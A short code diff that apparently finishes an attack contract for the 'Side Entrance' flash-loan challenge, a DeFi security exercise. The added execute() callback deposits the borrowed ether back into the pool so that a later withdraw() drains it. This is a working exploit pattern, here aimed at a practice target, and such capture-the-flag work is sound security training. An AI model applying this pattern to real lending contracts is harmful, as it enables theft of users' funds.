@@ -18,6 +18,11 @@ contract AttackSideEntrance {
     function attack() external {
         pool.flashLoan(amount);
         pool.withdraw();
-        
     }
+
+    function execute() external payable {
+        pool.deposit{value: amount}();
+    }
+
+    receive() external payable {}
 }
